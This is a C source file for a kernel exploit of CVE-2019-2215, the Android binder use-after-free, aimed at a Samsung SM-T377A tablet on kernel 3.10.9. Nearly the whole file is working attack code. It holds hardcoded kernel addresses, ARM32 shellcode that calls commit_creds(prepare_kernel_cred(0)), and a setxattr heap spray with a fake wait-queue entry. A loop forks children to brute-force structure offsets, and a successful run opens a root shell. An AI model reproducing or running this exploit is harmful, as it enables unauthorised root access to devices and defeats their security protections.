/*
 * cve_2019_2215.c — CVE-2019-2215 exploit for SM-T377A
 *
 * Vulnerability: binder_thread freed via BINDER_THREAD_EXIT while
 * epoll still holds a reference to thread->wait. Spray controlled
 * data into freed slot, trigger wake-up → function pointer hijack.
 *
 * Target: Samsung SM-T377A, kernel 3.10.9, patch level 2017-07
 * No KASLR, no PXN, no stack canaries
 *
 * Known addresses:
 *   commit_creds   = 0xc0054328
 *   prepare_kernel_cred = 0xc00548e0
 */
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <unistd.h>
#include <pthread.h>

#ifndef __NR_setxattr
#define __NR_setxattr 226
#endif

/* Binder */
#define BINDER_WRITE_READ    _IOWR('b', 1, struct binder_write_read)
#define BINDER_SET_MAX_THREADS _IOW('b', 5, uint32_t)
#define BINDER_THREAD_EXIT   _IOW('b', 8, int32_t)
#define BINDER_VERSION       _IOWR('b', 9, struct binder_version)

struct binder_write_read {
    signed long write_size;
    signed long write_consumed;
    unsigned long write_buffer;
    signed long read_size;
    signed long read_consumed;
    unsigned long read_buffer;
};
struct binder_version { signed long protocol_version; };
#define BC_ENTER_LOOPER 0x630c
#define BINDER_MMAP_SIZE (128 * 1024)

/* Kernel addresses (from firmware, no KASLR) */
#define COMMIT_CREDS        0xc0054328
#define PREPARE_KERNEL_CRED 0xc00548e0

/*
 * Shellcode: runs in kernel context
 * commit_creds(prepare_kernel_cred(0))
 *
 * On ARM32:
 *   mov r0, #0
 *   ldr r1, =prepare_kernel_cred
 *   blx r1
 *   ldr r1, =commit_creds
 *   blx r1
 *   mov r0, #0      ; return 0 from the fake wait function
 *   bx  lr
 */
static uint32_t shellcode[] = {
    0xe3a00000,  /* mov r0, #0 */
    0xe59f1010,  /* ldr r1, [pc, #16] ; prepare_kernel_cred addr */
    0xe12fff31,  /* blx r1 */
    0xe59f1008,  /* ldr r1, [pc, #8] ; commit_creds addr */
    0xe12fff31,  /* blx r1 */
    0xe3a00000,  /* mov r0, #0 */
    0xe12fff1e,  /* bx lr */
    PREPARE_KERNEL_CRED,
    COMMIT_CREDS,
};

/*
 * Fake wait_queue_entry structure
 * Layout (ARM32):
 *   offset 0: flags (uint)
 *   offset 4: private (void* — task_struct, set to current)
 *   offset 8: func (wait_queue_func_t) — THE FUNCTION POINTER
 *   offset 12: task_list.next
 *   offset 16: task_list.prev
 */
struct fake_wait_entry {
    uint32_t flags;
    uint32_t private_task;
    uint32_t func;          /* shellcode address */
    uint32_t task_list_next;
    uint32_t task_list_prev;
};

/*
 * Attempt exploit at a specific wait_queue_head offset
 */
static int try_exploit(int wait_offset) {
    printf("\n[*] Trying wait_queue_head offset: %d\n", wait_offset);

    /* Step 1: Map shellcode at a known address */
    void *sc_page = mmap((void*)0x42000000, 4096,
                         PROT_READ | PROT_WRITE | PROT_EXEC,
                         MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (sc_page == MAP_FAILED) {
        printf("[-] Shellcode mmap failed: %s\n", strerror(errno));
        return -1;
    }
    memcpy(sc_page, shellcode, sizeof(shellcode));

    /* Set up fake wait_queue_entry in userspace */
    struct fake_wait_entry *fake = (struct fake_wait_entry*)((char*)sc_page + 0x100);
    fake->flags = 0;
    fake->private_task = 0;    /* will be checked but usually OK as NULL */
    fake->func = (uint32_t)sc_page;  /* point to shellcode */
    /* task_list: point back to self to terminate iteration */
    fake->task_list_next = (uint32_t)&fake->task_list_next;
    fake->task_list_prev = (uint32_t)&fake->task_list_next;

    printf("  Shellcode at: %p\n", sc_page);
    printf("  Fake entry at: %p (func=0x%x)\n", fake, fake->func);

    /* Step 2: Open binder */
    int binder_fd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    if (binder_fd < 0) { perror("binder"); return -1; }

    void *map = mmap(NULL, BINDER_MMAP_SIZE, PROT_READ,
                     MAP_PRIVATE, binder_fd, 0);
    if (map == MAP_FAILED) { perror("binder mmap"); close(binder_fd); return -1; }

    uint32_t max_threads = 0;
    ioctl(binder_fd, BINDER_SET_MAX_THREADS, &max_threads);

    /* Step 3: Add to epoll → creates binder_thread */
    int epfd = epoll_create1(0);
    struct epoll_event ev = { .events = EPOLLIN };
    if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &ev) < 0) {
        printf("[-] epoll_ctl: %s\n", strerror(errno));
        close(binder_fd); close(epfd); return -1;
    }

    /* Step 4: Free binder_thread */
    ioctl(binder_fd, BINDER_THREAD_EXIT, &(int32_t){0});
    printf("  binder_thread freed (THREAD_EXIT)\n");

    /* Step 5: Spray to reclaim the freed slot */
    /* Build spray data: 512 bytes with fake wait_queue_head at the right offset */
    uint8_t spray[512];
    memset(spray, 0, sizeof(spray));

    /* Set the wait_queue_head_t at the estimated offset:
     * - lock (spinlock_t): 0 (unlocked)
     * - task_list.next: points to our fake wait_queue_entry
     * - task_list.prev: points to our fake entry (or self)
     */
    *(uint32_t*)(spray + wait_offset + 0) = 0;  /* spinlock = unlocked */
    *(uint32_t*)(spray + wait_offset + 4) = (uint32_t)fake; /* next → fake entry */
    *(uint32_t*)(spray + wait_offset + 8) = (uint32_t)fake; /* prev → fake entry */

    /* Also set up the fake entry's task_list to point back to the head
     * so list traversal terminates */
    fake->task_list_next = (uint32_t)(spray + wait_offset + 4); /* back to head.next */
    fake->task_list_prev = (uint32_t)(spray + wait_offset + 4);

    /* Spray via setxattr — multiple attempts to increase chance of reclaim */
    printf("  Spraying %d setxattr...\n", 200);
    for (int i = 0; i < 200; i++) {
        char name[32];
        snprintf(name, sizeof(name), "user.x%d", i);
        syscall(__NR_setxattr, "/data/local/tmp/xx", name,
                spray, sizeof(spray), 0);
    }

    /* Step 6: Trigger the UAF
     * epoll_ctl DEL will access the freed binder_thread's wait queue */
    printf("  Triggering UAF via epoll_ctl DEL...\n");
    fflush(stdout);

    /* Check UID before */
    uid_t before_uid = getuid();
    printf("  UID before: %d\n", before_uid);

    /* Trigger! This may crash if offset is wrong */
    epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &ev);

    /* Check if we got root */
    uid_t after_uid = getuid();
    printf("  UID after: %d\n", after_uid);

    if (after_uid == 0) {
        printf("\n[!!!] GOT ROOT! uid=%d\n", after_uid);
        /* Spawn a shell */
        system("/system/bin/sh");
        return 0;
    }

    /* Cleanup */
    close(binder_fd);
    close(epfd);
    munmap(sc_page, 4096);

    return (after_uid == 0) ? 0 : -1;
}

int main(void) {
    printf("=== CVE-2019-2215 Exploit — SM-T377A ===\n");
    printf("Kernel: 3.10.9, Patch: 2017-07\n");
    printf("commit_creds=0x%08x prepare_kernel_cred=0x%08x\n",
           COMMIT_CREDS, PREPARE_KERNEL_CRED);
    printf("UID: %d\n\n", getuid());

    /* The binder_thread's wait_queue_head_t offset varies by config.
     * On kernel 3.10 ARM32, estimated offsets:
     *
     * struct binder_thread:
     *   0:  rb_node (12 bytes)
     *   12: proc (4)
     *   16: transaction_stack (4)
     *   20: todo (8)
     *   28: return_error (4)
     *   32: return_error2 (4)
     *   36: wait (12)  ← MOST LIKELY
     *
     * But Samsung may have added fields (Knox, stats, etc.)
     * Try several offsets.
     *
     * Also the binder_thread might be in kmalloc-256 (ARM32 is smaller)
     * We try 512-byte spray first (covers both possibilities)
     */

    /* Safety: create the test file for setxattr */
    int f = open("/data/local/tmp/xx", O_CREAT | O_WRONLY, 0666);
    if (f >= 0) close(f);

    /* First, do a safe detection pass */
    printf("--- Phase 1: Safe detection ---\n");
    printf("Opening binder, adding to epoll, exiting thread...\n");

    int binder_fd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    if (binder_fd < 0) { perror("binder"); return 1; }
    void *m = mmap(NULL, BINDER_MMAP_SIZE, PROT_READ, MAP_PRIVATE, binder_fd, 0);
    int epfd = epoll_create1(0);
    struct epoll_event ev = { .events = EPOLLIN };
    epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &ev);
    ioctl(binder_fd, BINDER_THREAD_EXIT, &(int32_t){0});

    printf("Thread freed. epoll has dangling reference.\n");
    printf("Doing safe cleanup (no spray, just close)...\n");
    epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &ev);
    close(binder_fd);
    close(epfd);
    printf("Detection pass survived.\n\n");

    /* Phase 2: Try exploit at different offsets */
    printf("--- Phase 2: Exploit attempts ---\n");
    printf("Trying multiple wait_queue_head offsets...\n\n");

    /* Try the most likely offsets */
    int offsets[] = { 36, 40, 44, 48, 52, 56, 60, 64, 68, 72, 76, 80, 100, 120, 140 };

    for (int i = 0; i < (int)(sizeof(offsets)/sizeof(offsets[0])); i++) {
        pid_t pid = fork();
        if (pid == 0) {
            /* Child — try exploit (may crash) */
            alarm(5);
            int r = try_exploit(offsets[i]);
            _exit(r == 0 ? 42 : 1);
        }
        int status;
        waitpid(pid, &status, 0);

        if (WIFEXITED(status)) {
            if (WEXITSTATUS(status) == 42) {
                printf("\n[!!!] EXPLOIT SUCCEEDED at offset %d!\n", offsets[i]);
                /* The child got root — try again in parent */
                try_exploit(offsets[i]);
                return 0;
            }
            printf("  offset %d: child exited normally (no root)\n", offsets[i]);
        } else if (WIFSIGNALED(status)) {
            printf("  offset %d: child killed by signal %d (CRASH!)\n",
                   offsets[i], WTERMSIG(status));
            /* Crash means we hit the wrong offset but the UAF IS REAL */
            printf("  ** UAF CONFIRMED — wrong offset caused crash **\n");
        }
    }

    printf("\n--- Phase 3: Check dmesg ---\n");
    fflush(stdout);
    system("dmesg 2>/dev/null | tail -20 | grep -i -E 'oops|bug|panic|fault|binder|Backtrace|PC.is|Unable' 2>/dev/null");

    printf("\n=== Done ===\n");
    return 0;
}
